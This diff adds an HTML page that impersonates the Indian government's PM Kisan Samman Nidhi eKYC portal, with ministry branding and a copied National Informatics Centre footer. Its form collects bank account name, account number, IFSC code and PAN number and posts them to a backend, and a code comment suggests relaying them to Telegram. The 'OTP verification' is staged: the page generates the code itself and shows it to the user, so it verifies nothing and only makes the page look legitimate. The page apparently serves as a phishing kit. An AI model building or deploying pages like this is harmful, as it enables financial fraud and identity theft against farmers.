@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTP Based eKYC</title>
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.css"/>
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick-theme.css"/>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        /* General Styles */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f4f7;
+        }
+
+        /* Top Header Styles */
+        .top-header {
+            background-color: white;
+            color: black;
+            padding: 10px 15px;
+            text-align: center;
+            border-bottom: 1px solid #ddd;
+        }
+
+        .top-header h2 {
+            margin: 0;
+            font-size: 1.2rem;
+            font-weight: bold;
+        }
+
+        .top-header p {
+            margin: 5px 0;
+            font-size: 0.9rem;
+        }
+
+        .top-header a {
+            color: #1565c0;
+            text-decoration: none;
+            font-size: 0.9rem;
+        }
+
+        .top-header a:hover {
+            text-decoration: underline;
+        }
+
+        /* Header Section */
+        .header {
+            background-color: #1565c0;
+            color: white;
+            padding: 10px 15px;
+            text-align: center;
+        }
+
+        .header h1 {
+            margin: 0;
+            font-size: 1.5rem;
+        }
+
+        .header p {
+            margin: 10px 0;
+            font-size: 0.9rem;
+        }
+
+        /* Left Image and Header Section */
+        .left-image-section {
+            display: flex;
+            align-items: center;
+            padding: 15px;
+            background-color: #1565c0;
+        }
+
+        .left-image-section img {
+            max-height: 100px;
+            margin-right: 20px;
+        }
+
+        .left-image-section-text {
+            color: white;
+        }
+
+        /* Main Content Section */
+        .main-content {
+            padding: 15px;
+        }
+
+        /* Form Section */
+        .ekyc-form {
+            background-color: #ffffff;
+            padding: 25px;
+            border-radius: 10px;
+            width: 40%;
+            margin: 20px auto;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+
+        .ekyc-form input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 1rem;
+        }
+
+        .ekyc-form input:focus {
+            border-color: #1565c0;
+            outline: none;
+        }
+
+        .ekyc-form button {
+            background-color: #1565c0;
+            color: white;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 1rem;
+            transition: background-color 0.3s ease;
+        }
+
+        .ekyc-form button:hover {
+            background-color: #0044cc;
+        }
+
+        /* Loading Animation */
+        .loading-spinner {
+            display: none;
+            margin: 20px auto;
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-top: 4px solid #1565c0;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Stylish Message Box */
+        .message-box {
+            display: none;
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: #ff4444;
+            color: white;
+            padding: 15px 25px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            z-index: 1000;
+            animation: slideIn 0.5s ease-out;
+        }
+
+        @keyframes slideIn {
+            0% { top: -50px; opacity: 0; }
+            100% { top: 20px; opacity: 1; }
+        }
+
+        .message-box.success {
+            background-color: #00C851;
+        }
+
+        .message-box.error {
+            background-color: #ff4444;
+        }
+
+        /* Footer Section */
+        .footer {
+            background-color: rgb(0, 0, 0);
+            color: white;
+            padding: 15px;
+            text-align: center;
+        }
+
+        .footer-links {
+            margin-bottom: 10px;
+        }
+
+        .footer-links a {
+            color: white;
+            text-decoration: none;
+            font-size: 0.8rem;
+            margin: 0 5px;
+        }
+
+        .footer-text p {
+            font-size: 0.8rem;
+            margin: 5px 0;
+        }
+
+        .copyright p {
+            font-size: 0.8rem;
+            margin: 5px 0;
+        }
+
+        /* Responsive Design for Mobile */
+        @media (max-width: 768px) {
+            .ekyc-form {
+                width: 80%;
+            }
+        }
+    
+        .mid-banner img {
+            max-width: 50%;  /* Adjust the percentage as per your requirement */
+            height: auto;
+            margin: 0 auto;
+            display: block;
+        }
+
+        /* OTP Popup Styles */
+        .otp-popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            z-index: 1000;
+            text-align: center;
+        }
+
+        .otp-popup input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        .otp-popup button {
+            background-color: #1565c0;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <!-- Top Header -->
+    <div class="top-header">
+        <h2>भारत सरकार | GOVERNMENT OF INDIA</h2>
+        <p>कृषि और किसान कल्याण मंत्रालय | MINISTRY OF AGRICULTURE & FARMERS WELFARE</p>
+        <a href="#main-content">Skip to Main Content</a>
+    </div>
+
+    <!-- Header Section -->
+    <header class="header">
+        <div class="left-image-section">
+            <img src="1image2.png" alt="PM Kisan Logo">
+            <div class="left-image-section-text">
+                <h1>PM Kisan Samman Nidhi</h1>
+                <p>Department of Agriculture and Farmers Welfare<br>Ministry of Agriculture and Farmers Welfare<br>Government of India</p>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content Section -->
+    <main class="main-content" id="main-content">
+        <div class="ekyc-form">
+            <h3>OTP Based eKYC Form</h3>
+            <form id="ekycForm" action="#" method="POST">
+                <input type="text" id="bankName" name="bankName" placeholder="Enter Bank Account Name (10-50 characters)" required minlength="10" maxlength="50"><br>
+                <input type="text" id="accountNumber" name="accountNumber" placeholder="Enter Account Number (10-20 digits)" required minlength="10" maxlength="20" oninput="this.value = this.value.replace(/[^0-9]/g, '')"><br>
+                <input type="text" id="ifscCode" name="ifscCode" placeholder="Enter IFSC Code (5-13 characters)" required minlength="5" maxlength="13"><br>
+                <input type="text" id="panCard" name="panCard" placeholder="Enter PAN Card Number (e.g., ABCDE1234F)" required minlength="10" maxlength="10" oninput="this.value = this.value.toUpperCase()"><br>
+                <button type="submit" id="nextButton">Next</button>
+                <div class="loading-spinner" id="loadingSpinner"></div>
+            </form>
+        </div>
+    </main>
+
+    <!-- OTP Popup -->
+    <div class="otp-popup" id="otpPopup">
+        <h3>OTP Verification</h3>
+        <p>Please enter the OTP sent to your registered mobile number.</p>
+        <input type="text" id="otpInput" placeholder="Enter OTP" maxlength="6">
+        <button id="verifyOtpButton">Verify OTP</button>
+        <p id="otpMessage"></p>
+        <p id="otpTimer"></p>
+    </div>
+
+    <!-- Stylish Message Box -->
+    <div class="message-box" id="messageBox"></div>
+
+    <!-- Footer Section -->
+    <footer class="footer">
+        <div class="mid-banner">
+            <img src="footer2.jpg" alt="Government of India Ministry of Agriculture Banner">
+        </div>
+        <div class="footer-content">
+            <div class="footer-links">
+                <a href="#disclaimer">Disclaimer</a> | 
+                <a href="#terms">Terms and Conditions</a> | 
+                <a href="#privacy">Privacy Policy</a> | 
+                <a href="#copyright">Copyright Policy</a> | 
+                <a href="#linking">Hyperlinking Policy</a> | 
+                <a href="#accessibility">Accessibility</a>
+            </div>
+            <div class="footer-text">
+                <p>Privacy Policy For Mobile App</p>
+                <p>Site is designed and hosted by National Informatics Centre. Contents published and managed by Department of Agriculture, Cooperation & Farmers Welfare, Ministry of Agriculture and Farmers Welfare, Government of India.</p>
+                <p>Page Last Updated on : 09/02/2025</p>
+            </div>
+            <div class="mid-banner">
+                <img src="footer3.jpg" alt="Government of India Ministry of Agriculture Banner">
+            </div>
+            <div class="copyright">
+                <p>&copy; 2023 PM KISAN Samman Nidhi. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+     <!-- Script to Handle Form Submission -->
+     <script>
+        document.getElementById('ekycForm').addEventListener('submit', async function (e) {
+            e.preventDefault(); // Prevent default form submission
+
+            // Show loading spinner
+            document.getElementById('loadingSpinner').style.display = 'block';
+
+            // Collect form data
+            const formData = {
+                bankName: document.getElementById('bankName').value,
+                accountNumber: document.getElementById('accountNumber').value,
+                ifscCode: document.getElementById('ifscCode').value,
+                panCard: document.getElementById('panCard').value,
+            };
+
+            try {
+                // Send data to backend (or directly to Telegram API)
+                const response = await fetch('/submit-ekyc', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(formData),
+                });
+
+                if (response.ok) {
+                    alert('Form submitted successfully!');
+                } else {
+                    alert('Failed to submit form.');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('An error occurred while submitting the form.');
+            } finally {
+                // Hide loading spinner
+                document.getElementById('loadingSpinner').style.display = 'none';
+            }
+        });
+    </script>
+
+    
+
+    <!-- Script to Handle Form Submission, Loading Animation, and Stylish Messages -->
+    <script>
+        let generatedOtp = '';
+        let otpAttempts = 0;
+        let otpTimer;
+        let otpExpired = false;
+
+        // Function to generate a random 6-digit OTP
+        function generateOtp() {
+            return Math.floor(100000 + Math.random() * 900000).toString();
+        }
+
+        // Function to show stylish message box
+        function showMessage(message, type) {
+            const messageBox = document.getElementById('messageBox');
+            messageBox.textContent = message;
+            messageBox.className = `message-box ${type}`;
+            messageBox.style.display = 'block';
+
+            // Hide the message box after 10 seconds
+            setTimeout(() => {
+                messageBox.style.display = 'none';
+            }, 10000);
+        }
+
+        // Function to show OTP popup
+        function showOtpPopup() {
+            generatedOtp = generateOtp();
+            document.getElementById('otpPopup').style.display = 'block';
+            showMessage(`Your OTP is: ${generatedOtp}`, 'success');
+            startOtpTimer();
+        }
+
+        // Function to hide OTP popup
+        function hideOtpPopup() {
+            document.getElementById('otpPopup').style.display = 'none';
+        }
+
+        // Function to start OTP timer
+        function startOtpTimer() {
+            let timeLeft = 30;
+            otpExpired = false;
+            otpTimer = setInterval(() => {
+                document.getElementById('otpTimer').textContent = `OTP expires in ${timeLeft} seconds`;
+                timeLeft--;
+                if (timeLeft < 0) {
+                    clearInterval(otpTimer);
+                    otpExpired = true;
+                    document.getElementById('otpTimer').textContent = 'OTP expired. Please request a new OTP.';
+                    showMessage('OTP expired. Please request a new OTP.', 'error');
+                }
+            }, 1000);
+        }
+
+        // Function to handle OTP verification
+        function verifyOtp() {
+            const otpInput = document.getElementById('otpInput').value;
+            if (otpExpired) {
+                showMessage('OTP expired. Please request a new OTP.', 'error');
+                return;
+            }
+            if (otpInput === generatedOtp) {
+                showMessage('OTP verified successfully! ✅', 'success');
+                hideOtpPopup();
+                // Redirect to success page
+                window.location.href = 'succkyc.html';
+            } else {
+                otpAttempts++;
+                if (otpAttempts >= 2) {
+                    showMessage('Too many incorrect attempts. Please try again after 24 hours. ⏳', 'error');
+                    hideOtpPopup();
+                    // Disable form submission for 24 hours
+                    document.getElementById('ekycForm').style.display = 'none';
+                    document.getElementById('messageBox').style.display = 'block';
+                    document.getElementById('messageBox').textContent = 'Please try again after 24 hours.';
+                    document.getElementById('messageBox').className = 'message-box error';
+                } else {
+                    showMessage('Incorrect OTP. Please try again. ❌', 'error');
+                }
+            }
+        }
+
+        document.getElementById('ekycForm').addEventListener('submit', function(e) {
+            e.preventDefault();  // Prevent default form submission
+
+            // Show loading spinner
+            document.getElementById('loadingSpinner').style.display = 'block';
+
+            // Validate Bank Account Name (10-50 characters)
+            const bankName = document.getElementById('bankName').value;
+            if (bankName.length < 10 || bankName.length > 50) {
+                showMessage('Bank name must be between 10 and 50 characters 🏦', 'error');
+                document.getElementById('loadingSpinner').style.display = 'none';
+                return;
+            }
+
+            // Validate Account Number (10-20 digits)
+            const accountNumber = document.getElementById('accountNumber').value;
+            const accountNumberRegex = /^\d{10,20}$/;  // 10-20 digits
+            if (!accountNumberRegex.test(accountNumber)) {
+                showMessage('Account number must be 10-20 digits 🔢', 'error');
+                document.getElementById('loadingSpinner').style.display = 'none';
+                return;
+            }
+
+            // Validate IFSC Code (5-13 characters)
+            const ifscCode = document.getElementById('ifscCode').value;
+            if (ifscCode.length < 5 || ifscCode.length > 13) {
+                showMessage('IFSC code must be between 5 and 13 characters 🔠', 'error');
+                document.getElementById('loadingSpinner').style.display = 'none';
+                return;
+            }
+
+            // Validate PAN Card (10 characters, format: ABCDE1234F)
+            const panCard = document.getElementById('panCard').value;
+            const panCardRegex = /^[A-Z]{5}[0-9]{4}[A-Z]{1}$/;  // 5 letters, 4 numbers, 1 letter
+            if (!panCardRegex.test(panCard)) {
+                showMessage('PAN card must be in the format ABCDE1234F 🆔', 'error');
+                document.getElementById('loadingSpinner').style.display = 'none';
+                return;
+            }
+
+            // Simulate form submission (replace with actual API call)
+            setTimeout(() => {
+                // Hide the loading spinner
+                document.getElementById('loadingSpinner').style.display = 'none';
+
+                // Show OTP popup
+                showOtpPopup();
+            }, 2000);
+        });
+
+        // Add event listener for OTP verification button
+        document.getElementById('verifyOtpButton').addEventListener('click', verifyOtp);
+    </script>
+</body>
+</html>
